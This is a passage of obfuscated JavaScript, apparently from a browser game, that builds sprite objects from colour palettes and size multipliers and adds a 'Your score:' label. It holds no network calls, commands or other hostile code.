			ⵠⲆ[Ⲇ.ⵠᐃⲆⵠΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ⵠⵠⲆⵠᐃⲆᐃ(ᐃ * .4, ⵠⲆΔᐃⲆ, [ⵠ[111], ⵠ[561], ⵠ[174], "#54bf96", ⵠ[181], ⵠ[103]])));
			ⵠⲆ[Ⲇ.ᐃΔⵠᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃΔⵠᐃⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ᐃΔⲆⲆᐃᐃΔ(.4 * ᐃ, true, [ⵠ[111], "#6ad9e8", ⵠ[448], "#95e9f5", "#022320", "#011e19", ⵠ[210]])));
			ⵠⲆ[Ⲇ.ᐃΔⵠᐃⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ᐃΔⲆⲆᐃᐃΔ(.4 * ᐃ, true, [ⵠ[111], ⵠ[74], ⵠ[102], "#93eaf1", ⵠ[522], ⵠ[357]])));
			ⵠⲆ[Ⲇ.ⵠⵠᐃⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠᐃⲆⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⵠⵠⵠⵠ, ⲆΔⵠΔⲆΔⵠ(ᐃ * .4, ᐃⵠΔᐃΔ, [ⵠ[111], ⵠ[525], ⵠ[116], "#cc81e7", ⵠ[435], ⵠ[76], ⵠ[210]])));
			ⵠⲆ[Ⲇ.ⵠⵠᐃⲆⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⲆᐃΔᐃ, ⲆΔⵠΔⲆΔⵠ(.4 * ᐃ, ⵠᐃⲆᐃΔ, [ⵠ[111], ⵠ[436], ⵠ[459], "#966de6", ⵠ[522], ⵠ[357]])));
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠᐃⵠⲆⵠⲆⵠ(ᐃ * .9, false, ["#0d4f35"], 0)));
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠᐃⵠⲆⵠⲆⵠ(ᐃ * .9, false, ["#0d4f35"], ⵠΔⵠΔ)));
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠᐃⵠⲆⵠⲆⵠ(.9 * ᐃ, false, ["#0d4f35"], 2)));
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠᐃⵠⲆⵠⲆⵠ(.9 * ᐃ, false, ["#053339"], ⵠⲆᐃⵠ)));
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠᐃⵠⲆⵠⲆⵠ(.9 * ᐃ, false, ["#053339"], 1)));
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠᐃⵠⲆⵠⲆⵠ(.9 * ᐃ, ᐃⲆᐃⵠΔ, ["#053339"], ⲆⲆΔᐃ)));
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠⲆⲆⲆⵠΔᐃ(.8 * ᐃ, ["#241301", "#ba6b0e", "#6d3f04"])));
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠⲆⲆⲆⵠΔᐃ(ᐃ * .8, ["#292002", "#ba930e", "#6d5704"])));
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠⲆⲆⲆⵠΔᐃ(ᐃ * .9, ["#052919", "#0a4738", "#06321f"])));
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠⲆⲆⲆⵠΔᐃ(.8 * ᐃ, ["#052918", "#08491c", "#063417"])));
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(Math.PI / 2, ΔⲆᐃⲆⵠⵠᐃ(.25 * ᐃ, ΔᐃΔΔⵠ, [ⵠ[111], ⵠ[384], ⵠ[430], ⵠ[157]])));
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(Math.PI / 2, ΔⲆᐃⲆⵠⵠᐃ(.25 * ᐃ, ⲆⵠⵠᐃⲆ, [ⵠ[453], ⵠ[160], ⵠ[164], ⵠ[65]])));
			ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠᐃᐃ].push(ⵠᐃⵠ(ⲆⵠΔⲆᐃⵠⵠ(ᐃ * .25, [ⵠ[384], ⵠ[430], ⵠ[157]], ᐃⵠⲆⵠ)));
			ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠᐃᐃ].push(ⵠᐃⵠ(ⲆⵠΔⲆᐃⵠⵠ(.25 * ᐃ, ["#4f371e", "#624d30", "#5e472c", ⵠ[530]], ᐃᐃⲆΔ)));
			ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠᐃᐃ].push(ⵠᐃⵠ(ⲆⵠΔⲆᐃⵠⵠ(ᐃ * .25, ["#382715", "#4e3c25", "#473620", ⵠ[38]], ᐃⲆⵠᐃ)));
			ⵠⲆ[Ⲇ.Ⲇⵠⵠᐃᐃ] = [];
			ⵠⲆ[Ⲇ.Ⲇⵠⵠᐃᐃ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.Ⲇⵠⵠᐃᐃ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.Ⲇⵠⵠᐃᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⲆΔⲆΔ(Math.PI / 2, ⲆⲆᐃᐃᐃⵠᐃ(ᐃ * .25, ᐃⵠⵠⲆᐃ, [ⵠ[111], ⵠ[384], ⵠ[430], ⵠ[157], ⵠ[416]], ⵠⲆΔ))));
			ⵠⲆ[Ⲇ.Ⲇⵠⵠᐃᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⲆΔⲆΔ(Math.PI / 2, ⲆⲆᐃᐃᐃⵠᐃ(ᐃ * .25, ⲆⵠΔⵠΔ, [ⵠ[453], ⵠ[160], ⵠ[164], ⵠ[65], ⵠ[416]], ΔΔᐃⵠ))));
			ⵠⲆ[Ⲇ.Ⲇⵠⵠᐃᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⲆΔⲆΔ(Math.PI / 2, ⲆⲆᐃᐃᐃⵠᐃ(.25 * ᐃ, ΔᐃⵠᐃⲆ, [ⵠ[111], ⵠ[384], ⵠ[430], ⵠ[157], "#4f9246"], ⲆⵠΔΔ))));
			ⵠⲆ[Ⲇ.Ⲇⵠⵠᐃᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⲆΔⲆΔ(Math.PI / 2, ⲆⲆᐃᐃᐃⵠᐃ(ᐃ * .25, false, [ⵠ[453], ⵠ[160], ⵠ[164], ⵠ[65], "#4f9246"], 2))));
			ⵠⲆ[Ⲇ.Ⲇⵠⵠᐃᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⲆΔⲆΔ(Math.PI / ⵠΔⲆᐃ, ⲆⲆᐃᐃᐃⵠᐃ(ᐃ * .25, ΔⵠΔⲆΔ, [ⵠ[111], ⵠ[384], ⵠ[430], ⵠ[157], ⵠ[416], ⵠ[407]], ⵠⵠⵠⵠ))));
			ⵠⲆ[Ⲇ.Ⲇⵠⵠᐃᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⲆΔⲆΔ(Math.PI / ⲆⲆΔᐃ, ⲆⲆᐃᐃᐃⵠᐃ(.25 * ᐃ, false, [ⵠ[453], ⵠ[160], ⵠ[164], ⵠ[65], ⵠ[416], ⵠ[407]], 3))));
			ⵠⲆ[Ⲇ.Ⲇⵠⵠᐃᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⲆΔⲆΔ(Math.PI / ⵠΔⲆᐃ, ⲆⲆᐃᐃᐃⵠᐃ(.25 * ᐃ, false, [ⵠ[111], ⵠ[384], ⵠ[430], ⵠ[157], ⵠ[416], "#362513"], ⲆⵠΔⵠ))));
			ⵠⲆ[Ⲇ.Ⲇⵠⵠᐃᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⲆΔⲆΔ(Math.PI / Ⲇⵠⵠᐃ, ⲆⲆᐃᐃᐃⵠᐃ(ᐃ * .25, false, [ⵠ[453], ⵠ[160], ⵠ[164], ⵠ[65], ⵠ[416], "#664d2e"], 4))));
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆⲆ][Ⲇ.ⲆⵠΔ] = [ⵠᐃⵠ(ᐃΔⲆⵠⵠ(1.2 * ᐃ, ⲆⲆΔⲆⲆ, [ⵠ[434], "#0b8052", ⵠ[344]]))];
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆⲆ][Ⲇ.ΔⲆΔ] = [ⵠᐃⵠ(ᐃΔⲆⵠⵠ(ᐃ * 1.2, ⵠⵠⲆⲆΔ, [ⵠ[453], "#084442", ⵠ[275]]))];
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠΔΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠΔΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃΔⲆⵠⵠ(.8 * ᐃ, true, [ⵠ[434], ⵠ[1], ⵠ[565]]));
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠΔΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃΔⲆⵠⵠ(.8 * ᐃ, ⵠΔΔⵠΔⵠᐃ, [ⵠ[453], ⵠ[152], ⵠ[87]]));
			ⵠⲆ[Ⲇ.ⲆⲆⵠΔΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆⵠΔΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⵠⵠᐃⵠⲆ(ᐃ * .5, ⵠⲆⵠⵠΔ, [ⵠ[218], ⵠ[537], "#a6692f", "#bd7533", "#86683e", "#6e502d"]));
			ⵠⲆ[Ⲇ.ⲆⲆⵠΔΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⵠⵠᐃⵠⲆ(ᐃ * .5, true, [ⵠ[453], "#0a3429", ⵠ[164], "#082f25", "#082925", "#0a3630"]));
			ⵠⲆ[Ⲇ.ⲆΔⵠΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆΔⵠΔⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔᐃⲆⵠΔΔⲆ(ᐃ * .5, ᐃⲆⲆᐃΔ, [ⵠ[218], ⵠ[235], "#d2cfcf", "#e0e1e0", "#c4c4c4"]));
			ⵠⲆ[Ⲇ.ⲆΔⵠΔⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔᐃⲆⵠΔΔⲆ(ᐃ * .5, ᐃΔᐃⵠΔ, [ⵠ[453], "#2b5254", "#264a46", "#396260", "#244743"]));
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆⵠᐃⲆⵠⲆ(ᐃ * .5, true, [ⵠ[218], "#349970", "#245c45", "#348361", ⵠ[235], ⵠ[408]]));
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆⵠᐃⲆⵠⲆ(ᐃ * .5, ⲆΔΔⲆΔ, [ⵠ[453], "#0d5551", "#074440", "#0f5c58", "#4e8784", "#3f7572"]));
			ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔᐃᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃΔⲆⵠⵠ(.8 * ᐃ, true, [ⵠ[218], "#0b8052", ⵠ[344]]));
			ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔᐃᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃΔⲆⵠⵠ(.8 * ᐃ, true, [ⵠ[453], "#084442", ⵠ[275]]));
			ⵠⲆ[Ⲇ.ΔΔⲆΔⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ΔΔⲆΔⲆΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⵠⵠᐃⵠⲆ(ᐃ * .5, true, [ⵠ[218], ⵠ[1], ⵠ[565], "#5e5823", "#86683e", "#6e502d"]));
			ⵠⲆ[Ⲇ.ΔΔⲆΔⲆΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⵠⵠᐃⵠⲆ(.5 * ᐃ, true, [ⵠ[453], ⵠ[152], ⵠ[87], "#0c301e", "#062a1f", "#083b2b"]));
			ⵠⲆ[Ⲇ.ᐃᐃⲆΔᐃΔΔ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃⲆΔᐃΔΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔᐃⲆⵠΔΔⲆ(ᐃ * .5, true, [ⵠ[218], "#adbe9e", "#7e9178", "#84aa84", "#527556"]));
			ⵠⲆ[Ⲇ.ᐃᐃⲆΔᐃΔΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔᐃⲆⵠΔΔⲆ(.5 * ᐃ, true, [ⵠ[453], "#164a44", "#124244", "#13373b", "#133e3e"]));
			ⵠⲆ[Ⲇ.ΔⵠΔᐃΔᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⵠΔᐃΔᐃⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆⵠᐃⲆⵠⲆ(ᐃ * .5, true, [ⵠ[218], "#7a9160", "#4a5e3c", "#637e5a", "#c5cfc0", "#8a9685"]));
			ⵠⲆ[Ⲇ.ΔⵠΔᐃΔᐃⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆⵠᐃⲆⵠⲆ(.5 * ᐃ, ⲆⲆⲆΔⲆ, [ⵠ[453], "#3e5d5b", "#2f4442", "#354e4c", "#637d7c", "#556b6a"]));
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔⵠⲆΔⵠΔⵠ(ᐃ * .45, ΔᐃⲆⵠⵠ, [ⵠ[434], ⵠ[223], "#98171e", "#22a84f", "#1f924a"]));
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔⵠⲆΔⵠΔⵠ(ᐃ * .45, true, [ⵠ[434], "#19386e", "#0b2752", "#124252", "#0d3441"]));
			ⵠⲆ[Ⲇ.ΔΔᐃΔΔᐃⲆ] = ⵠᐃⵠ(ΔⵠⲆΔⵠΔⵠ(.65 * ᐃ, true, ["rgba(14, 48, 34, 0)", ⵠ[212], ⵠ[212], ⵠ[212], ⵠ[212]]));
			ⵠⲆ[Ⲇ.ⲆⲆΔΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆΔΔᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⲆⵠⲆᐃ(1.4 * ᐃ, ⲆⲆⲆᐃⵠ, [ⵠ[223], ⵠ[374]]));
			ⵠⲆ[Ⲇ.ⲆⲆΔΔᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⲆⵠⲆᐃ(ᐃ * 1.4, false, ["#46195e", "#744188"]));
			ⵠⲆ[Ⲇ.ⵠⲆΔᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆΔᐃΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃⲆⵠᐃΔⵠᐃ(ᐃ * .9, false, [ⵠ[507], "#ec8d35", "#e96132"]));
			ⵠⲆ[Ⲇ.ⵠⲆΔᐃΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃⲆⵠᐃΔⵠᐃ(.9 * ᐃ, ⲆⲆᐃⵠᐃ, ["#efdb7b", "#efe854", "#e8ef62"]));
			ⵠⲆ[Ⲇ.ᐃΔᐃⵠⵠᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃΔᐃⵠⵠᐃᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⵠⵠⲆⲆᐃⵠ(.9 * ᐃ, false, [ⵠ[516], ⵠ[382]]));
			ⵠⲆ[Ⲇ.ᐃΔᐃⵠⵠᐃᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⵠⵠⲆⲆᐃⵠ(ᐃ * .9, false, ["#282404", "#0a0a01"]));
			ⵠⲆ[Ⲇ.ⵠΔᐃᐃΔᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠΔᐃᐃΔᐃⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆᐃΔᐃⵠⵠ(ᐃ * .9, ᐃⵠΔⵠⲆ, [ⵠ[516], ⵠ[382]]));
			ⵠⲆ[Ⲇ.ⵠΔᐃᐃΔᐃⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆᐃΔᐃⵠⵠ(.9 * ᐃ, false, ["#282404", "#0a0a01"]));
			ⵠⲆ[Ⲇ.ΔⲆⵠᐃᐃΔⵠ] = [];
			ⵠⲆ[Ⲇ.ΔⲆⵠᐃᐃΔⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔⵠΔⵠΔᐃ(ᐃ * .9, false, [ⵠ[507]]));
			ⵠⲆ[Ⲇ.ΔⲆⵠᐃᐃΔⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔⵠΔⵠΔᐃ(ᐃ * .9, ᐃᐃΔᐃΔ, ["#fffabb"]));
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⵠΔⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⵠΔⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃΔⲆΔⵠⵠΔ(ᐃ * .9, false, [ⵠ[507]]));
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⵠΔⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃΔⲆΔⵠⵠΔ(ᐃ * .9, false, ["#fffabb"]));
			ⵠⲆ[Ⲇ.ⵠⵠΔⵠΔᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠΔⵠΔᐃΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔⵠΔⵠΔᐃ(ᐃ * .9, ⲆΔⵠⲆΔ, [ⵠ[507]]));
			ⵠⲆ[Ⲇ.ⵠⵠΔⵠΔᐃΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔⵠΔⵠΔᐃ(.9 * ᐃ, false, ["rgba(255, 84, 0, 1)"]));
			ⵠⲆ[Ⲇ.ⵠⵠⲆⲆΔΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⲆⲆΔΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃΔⲆΔⵠⵠΔ(ᐃ * .9, false, [ⵠ[507]]));
			ⵠⲆ[Ⲇ.ⵠⵠⲆⲆΔΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃΔⲆΔⵠⵠΔ(.9 * ᐃ, ⲆΔᐃⲆΔ, ["#ff5704"]));
			ⵠⲆ[Ⲇ.ⲆⲆΔΔⵠΔⵠ] = ⵠᐃⵠ(ᐃΔⵠⵠᐃᐃᐃ(ᐃ, ⵠ[407], 1));
			ⵠⲆ[Ⲇ.ⲆⵠᐃᐃⲆⵠⵠ] = ⵠᐃⵠ(ᐃΔⵠⵠᐃᐃᐃ(1.5 * ᐃ, ⵠ[407], 1));
			ⵠⲆ[Ⲇ.ᐃΔⵠΔΔᐃⵠ] = ⵠᐃⵠ(ᐃᐃΔΔᐃ(ᐃ, "Your score:", ᐃ * ⵠⲆΔⲆᐃᐃⲆ, ⵠ[253]));
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃᐃΔΔ] = ⵠᐃⵠ(ΔᐃΔᐃΔⲆⲆᐃᐃ(ᐃ * .9, [ⵠ[178], ⵠ[428], "#543B1C", "#694D28", "#4D3C1A", "#694D28", "#DEE2E0", "#CDCCCC", "#7B5A31", "#7E8A85"]));
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⲆΔⲆ] = ⲆΔ.ⲆᐃⲆⲆⲆΔⲆ;
			ⵠⲆ[Ⲇ.ΔΔⲆᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ΔΔⲆᐃᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⲆΔⵠⵠⲆⲆ(1.5 * ᐃ, true, [ⵠ[111], ⵠ[178], ⵠ[428], ⵠ[452], ⵠ[314], ⵠ[371], ⵠ[495], ⵠ[336], ⵠ[178], ⵠ[428]]));
			ⵠⲆ[Ⲇ.ΔΔⲆᐃᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⲆΔⵠⵠⲆⲆ(ᐃ * 1.5, true, [ⵠ[453], ⵠ[245], ⵠ[460], ⵠ[84], "#225755", "#07393D", "#07454a", "#0c484d", ⵠ[245], ⵠ[460]]));
			ⵠⲆ[Ⲇ.ⲆⲆⲆΔⲆⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆⲆΔⲆⲆⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃⵠⵠᐃⵠⲆᐃ(ᐃⲆⵠᐃΔ * ᐃ, true, [ⵠ[111], ⵠ[178], ⵠ[428], ⵠ[452], ⵠ[314], ⵠ[371], ⵠ[495], ⵠ[336], ⵠ[178], ⵠ[428]]));
			ⵠⲆ[Ⲇ.ⲆⲆⲆΔⲆⲆⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃⵠⵠᐃⵠⲆᐃ(ᐃ * 2, ⵠᐃⲆᐃΔ, [ⵠ[453], ⵠ[245], ⵠ[460], ⵠ[84], "#225755", "#07393D", "#07454a", "#0c484d", ⵠ[245], ⵠ[460]]));
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⲆΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⵠᐃᐃⵠⲆᐃ(1.5 * ᐃ, ⲆⵠⲆᐃⲆΔΔ, [ⵠ[111], ⵠ[178], ⵠ[428], ⵠ[452], ⵠ[314], ⵠ[371], ⵠ[495], ⵠ[336], ⵠ[178], ⵠ[428]]));
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⲆΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⵠᐃᐃⵠⲆᐃ(ᐃ * 1.5, ⲆⲆΔⲆⲆ, [ⵠ[453], ⵠ[245], ⵠ[460], ⵠ[84], "#225755", "#07393D", "#07454a", "#0c484d", ⵠ[245], ⵠ[460]]));
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠᐃΔᐃᐃⵠⲆ(ᐃ * 2.2, ΔᐃⲆⵠⵠ, [ⵠ[496], ⵠ[578]]));
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠᐃΔᐃᐃⵠⲆ(2.2 * ᐃ, true, ["#0B4049", "#08383D"]));
			ⵠⲆ[Ⲇ.ⵠⵠⲆᐃΔⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⲆᐃΔⲆⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠᐃΔᐃᐃⵠⲆ(2.2 * ᐃ, ⵠⲆⲆⵠᐃ, [ⵠ[ΔⵠⲆΔ], ⵠ[565]]));
			ⵠⲆ[Ⲇ.ⵠⵠⲆᐃΔⲆⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠᐃΔᐃᐃⵠⲆ(2.2 * ᐃ, ⲆⵠⲆᐃⲆΔΔ, [ⵠ[152], ⵠ[87]]));
			ⵠⲆ[Ⲇ.ΔⲆⵠᐃΔ] = [];
			ⵠⲆ[Ⲇ.ΔⲆⵠᐃΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(ᐃ * .8, true, [ⵠ[496], ⵠ[578]]));
			ⵠⲆ[Ⲇ.ΔⲆⵠᐃΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(ᐃ * .8, true, ["#15514F", "#0F3F3D"]));
			ⵠⲆ[Ⲇ.ⲆΔⲆᐃΔΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆΔⲆᐃΔΔⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(.8 * ᐃ, true, [ⵠ[537], "#b17238"]));
			ⵠⲆ[Ⲇ.ⲆΔⲆᐃΔΔⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(.8 * ᐃ, true, [ⵠ[10], ⵠ[148]]));
			ⵠⲆ[Ⲇ.ⲆⲆΔⲆⲆⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆΔⲆⲆⵠⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(ᐃ * .8, ⵠⲆⲆⵠᐃ, ["#3a8214", "#4a9c1e"]));
			ⵠⲆ[Ⲇ.ⲆⲆΔⲆⲆⵠⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(.8 * ᐃ, ⲆⲆⲆΔⲆ, ["#032d29", "#044640"]));
			ⵠⲆ[Ⲇ.ᐃᐃᐃΔⵠᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃᐃΔⵠᐃⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(.8 * ᐃ, true, [ⵠ[235], ⵠ[408]]));
			ⵠⲆ[Ⲇ.ᐃᐃᐃΔⵠᐃⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(ᐃ * .8, ᐃᐃⲆᐃᐃ, ["#1c6161", "#07413f"]));
			ⵠⲆ[Ⲇ.ΔΔᐃᐃᐃᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ΔΔᐃᐃᐃᐃⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(.8 * ᐃ, ΔΔⲆⲆΔ, ["#328a56", "#449573"]));
			ⵠⲆ[Ⲇ.ΔΔᐃᐃᐃᐃⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(.8 * ᐃ, true, [ⵠ[ⲆⵠⲆⲆᐃ], ⵠ[148]]));
			ⵠⲆ[Ⲇ.ⵠⲆⵠΔⲆᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⵠΔⲆᐃᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(.8 * ᐃ, true, ["#c98e2f", "#a36b11"]));
			ⵠⲆ[Ⲇ.ⵠⲆⵠΔⲆᐃᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(ᐃ * .8, ᐃⲆⲆᐃΔ, [ⵠ[10], ⵠ[148]]));
			ⵠⲆ[Ⲇ.ᐃᐃΔⵠᐃⲆΔ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃΔⵠᐃⲆΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(ᐃ * .8, ᐃⵠΔᐃΔ, ["#b22419", "#99110e"]));
